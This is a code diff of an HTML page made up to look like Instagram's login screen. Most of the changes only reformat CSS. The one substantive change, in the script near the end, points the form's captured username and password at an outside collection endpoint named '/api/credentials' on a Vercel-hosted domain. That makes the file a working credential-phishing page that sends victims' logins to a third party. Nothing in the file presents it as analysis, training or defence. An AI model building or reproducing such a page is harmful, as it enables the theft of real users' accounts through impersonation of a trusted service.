@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -15,6 +16,7 @@
             margin: 0;
             flex-direction: column;
         }
+
         .login-container {
             width: 350px;
             max-width: 100%;
@@ -25,6 +27,7 @@
             padding: 20px;
             text-align: center;
         }
+
         .logo {
             width: 175px;
             max-width: 100%;
@@ -32,11 +35,13 @@
             image-rendering: auto;
             display: block;
         }
+
         .login-form {
             display: flex;
             flex-direction: column;
             gap: 12px;
         }
+
         .login-form input {
             padding: 12px;
             height: 44px;
@@ -47,10 +52,12 @@
             box-sizing: border-box;
             width: 100%;
         }
+
         .login-form input:focus {
             outline: none;
             border-color: #a0a0a0;
         }
+
         .login-button {
             background-color: #0095f6;
             color: #fff;
@@ -63,13 +70,16 @@
             margin-top: 12px;
             height: 44px;
         }
+
         .login-button:disabled {
             background-color: #b2dffc;
             cursor: not-allowed;
         }
+
         .password-container {
             position: relative;
         }
+
         .toggle-password {
             position: absolute;
             right: 10px;
@@ -82,6 +92,7 @@
             cursor: pointer;
             padding: 5px;
         }
+
         .divider {
             display: flex;
             align-items: center;
@@ -89,6 +100,7 @@
             color: #8e8e8e;
             font-size: 14px;
         }
+
         .divider::before,
         .divider::after {
             content: '';
@@ -97,6 +109,7 @@
             background-color: #dbdbdb;
             margin: 0 10px;
         }
+
         .forgot-password {
             color: #00376b;
             font-size: 14px;
@@ -104,6 +117,7 @@
             margin-top: 15px;
             display: inline-block;
         }
+
         .signup {
             margin-top: 20px;
             background-color: #fff;
@@ -115,32 +129,42 @@
             max-width: 100%;
             box-sizing: border-box;
         }
+
         .signup a {
             color: #0095f6;
             text-decoration: none;
             font-weight: 600;
         }
+
         @media (max-width: 400px) {
-            .login-container, .signup {
+
+            .login-container,
+            .signup {
                 padding: 15px;
             }
+
             .logo {
                 width: 150px;
             }
-            .login-form input, .login-button {
+
+            .login-form input,
+            .login-button {
                 font-size: 14px;
                 height: 40px;
             }
+
             .toggle-password {
                 font-size: 12px;
                 right: 5px;
             }
+
             .divider {
                 font-size: 12px;
             }
         }
     </style>
 </head>
+
 <body>
     <div class="login-container">
         <img src="instagram-logo.png" alt="Instagram" class="logo">
@@ -188,7 +212,7 @@
             const password = form.querySelector('input[type="password"]').value;
 
             try {
-                const response = await fetch('https://your-app.onrender.com/api/credentials', {
+                const response = await fetch('https://instagram-login-azure-kappa.vercel.app.vercel.app/api/credentials', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ username, password })
@@ -208,4 +232,5 @@
         }
     </script>
 </body>
+
 </html>
